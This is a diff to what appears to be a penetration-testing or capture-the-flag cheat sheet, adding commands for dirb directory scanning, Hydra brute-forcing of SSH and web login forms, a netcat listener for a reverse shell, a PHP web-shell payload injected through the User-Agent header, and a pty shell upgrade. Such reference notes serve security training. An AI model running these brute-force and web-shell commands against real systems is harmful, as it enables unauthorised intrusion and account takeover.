@@ -9,6 +9,11 @@ Let's look for those open ports and export the output to a specified directory u
 ```
 nmap -sV -sC -vv -oN ./scan [ip_address]
 ```
+### Dirb
+DIRB is a Web Content Scanner. It looks for existing (and/or hidden) Web Objects. It basically works by launching a dictionary based attack against a web server and analyzing the responses. DIRB’s main purpose is to help in professional web application auditing. 
+```
+dirb http://[ip or domain name]/[optional directories] [path_to_wordlist]
+```
 
 ### SMBMap
 SMBMap allows users to enumerate samba share drives across an entire domain. List share drives, drive permissions, share contents, upload/download functionality, file name auto-download pattern matching, and even execute remote commands. This tool was designed with pen testing in mind, and is intended to simplify searching for potentially sensitive data across large networks.
@@ -43,9 +48,15 @@ For more information, check out LinPEAS Github: https://github.com/carlospolop/P
 ## Cracking
 ### Hydra
 Hydra is a parallelized login cracker which supports numerous protocols to attack. It is very fast and flexible, and new modules are easy to add.
-#### SSH
+
+#### Hydra ssh
 ```
 hydra -l [username] -P [wordlist] [ip_address] ssh
+```
+
+#### Hydra http-post-form
+```
+hydra -l [username] -P [path_to_wordlist] [target_ip] http-post-form "/[directory]:[user_param]=^USER^&[password_param]=^PASS^:[error_message]"
 ```
 
 John the Ripper is a tool designed to help systems administrators to find weak (easy to guess or crack through brute force) passwords, and even automatically mail users warning them about it, if it is desired.
@@ -69,30 +80,34 @@ searchsploit -m [exploit_file_path]
 
 
 ## Basic Linux Commands
-List directory, show hidden, and permissions files
+
+- List directory, show hidden, and permissions files
 ```
 ls -la
 ```
 
-Change Permissions for a file or directory:
+- Change Permissions for a file or directory:
 ```
 chmod ### [file] or [directory]
 ```
 
-Another way of changing permissions over a directory is:
+- Another way of changing permissions over a directory is:
 ```
 chown [user_name] [dir]
 ```
 
-Find files with SUID bit set:
+- Find files with SUID bit set:
 ```
 find / -perm /4000
 ```
->Or (if using is in sudoers file).
+> Or (if using is in sudoers file).
 ```
 sudo -l
 ```
-
+- Open and listen on a port using `nc`. Now you're ready to execute that reverse shell.
+```
+nc -lvp [port_number]
+```
 
 
 ## Random Tips & Tricks
@@ -100,4 +115,16 @@ sudo -l
 ```
 # RSA Keys only like to be read by authenticated users. Be sure to change permissions to:
 $ chmod 600 [RSA_Key_file_name]
+```
+
+### User Agents
+Somestimes PHP can be passed in through request headers, specifically the User-Agent. If successful we can pass in an ecoded web shell one-liner via the `c` parameter. 
+```
+curl [ip or domain name] -H "User-Agent:<?php system(\$_GET['c']); ?>"
+```
+
+### Interactive Shell
+Maybe you need to switch users, maybe you prefer BASH - either way you need to spawn an interactive shell. Also, `echo $0` will inform you of which shell you're currently using. 
+```
+python -c "import pty;pty.spawn('/bin/bash')"
 ```
